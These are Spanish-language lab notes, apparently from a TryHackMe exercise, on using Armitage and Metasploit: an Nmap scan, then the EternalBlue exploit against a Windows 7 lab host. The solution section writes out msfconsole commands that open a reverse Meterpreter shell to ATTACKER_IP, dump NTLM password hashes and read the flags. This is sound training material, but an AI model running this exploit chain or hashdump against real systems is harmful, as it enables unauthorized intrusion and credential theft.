---
layout: apunte
title: "5. Command, Control and Conquer"
---

<h2>Mismo Exploit</h2>
<h3>Enumeración de Hosts con Armitage</h3>
Antes de mandarte por ti mismo, vamos a demostrar cómo explotar una máquina virtual de ejemplo. Primero, ejecutaremos un escaneo de puertos en Armitage yendo a la sección "Hosts", haciendo hovering sobre "Nmap Scan" y seleccionando "Quick Scan".

!**Pasted image 20260514173134.png**

Después de seleccionar "Quick Scan", una nueva opción saldrá. Esta te pedirá introducir la dirección IP que deseas escanear.

!**Pasted image 20260514173300.png**

Después de presionar "Ok" y esperar un momento, deberías ver una nueva pestaña que se abre llamada "nmap" y una nueva máquina se muestra en la pestaña "Workspace". En la pestaña "nmap" verás los resultados del escaneo.

!**Pasted image 20260514173519.png**

Ahora que has aprendido a ejecutar escaneo de puertos básico, intenta ejecutar varios escaneos contra el obetivo y mira la información adicional que recibes del host.

<h3>Explotación con Armitage</h3>
Ahora, vamos a mostrar el proceso de explotación con Armitage; nuestra víctima es en nuestro ejemplo una máquina Windows 7. Esta máquina e vulnerable a el exploit clásico "Eternal Blue". Para encontrar esto, noe enfocaremos en la parte de la derecha de la pestaña con carpetas, expandiremos "Exploit", luego "Windows", luego "SMB" y ahí verás los exploits.

!**Pasted image 20260514174327.png**

Después podemos hacer doble click en el exploit que queramos explotar o arrastrarlo al host que queramos, y una nueva pestaña se abrirá. Haciendo click en "launch" lanzará el ataque.

!**Pasted image 20260514174727.png**

Después de hacer click en "Launch", notarás que se abre una nueva pestaña "Exploit". Armitage ejecutará todas las comprobaciones normales que Metasploit suele hacer. En el caso de Eternal Blue, corre los scripts de comprobación estándar seguidos de los scripts de exploit hasta que consigue una shell exitosa.

!**Pasted image 20260514183230.png**

Después de recibir la shell, haz click derecho en el host y selecciona "Interact". Esto se abrirá como una shell estándar con la que ya estás familiarizado. Para obtener la shell de Meterpreter, recomendamos que ejecutes el módulo `multi/manage/shell_to_meterpreter`.

!**Pasted image 20260514183449.png**

---------------------------------
<h2>Hora de Practicar</h2>
Ahora que has aprendido cómo explotar hosts usando Armitage, practicarás tus habilidades hackeando la máquina virtual con Metasploit y Armitage. Hay múltiples exploits que puedes seguir.

----------------------------------
<h2>Solución</h2>
Lanza Metasploit y usa Eternal Blue.

```bash
root@attackbox$ msfconsole -q
msf5 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
LHOST => eth0
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST VICTIM_IP
RHOST => VICTIM_IP
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on ATTACKER_IP:4444 
[*] VICTIM_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] VICTIM_IP:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] VICTIM_IP:445      - Scanned 1 of 1 hosts (100% complete)
[*] VICTIM_IP:445 - Connecting to target for exploitation.
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Con el nivel de acceso de sistema, podemos usar el comando `hashdump` para recuperar los hashes NTLM de los usuarios.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d<snip!>4d6e0943c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae93<snip!>d7e0c089c0:::
Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867<snip!>5c1309a5c:::
meterpreter > 
```

!**Pasted image 20260516234538.png**

Y ahora recuperamos la flags.

```bash
meterpreter > cat C:/Users/Administrator/Desktop/root.txt
THM{bd6ea6c87<snip!>21081132744}
meterpreter > cat C:/Users/Ted/Desktop/user.txt
THM{217fa45e3<snip!>fc0be28e760} 
```

!**Pasted image 20260516234652.png**

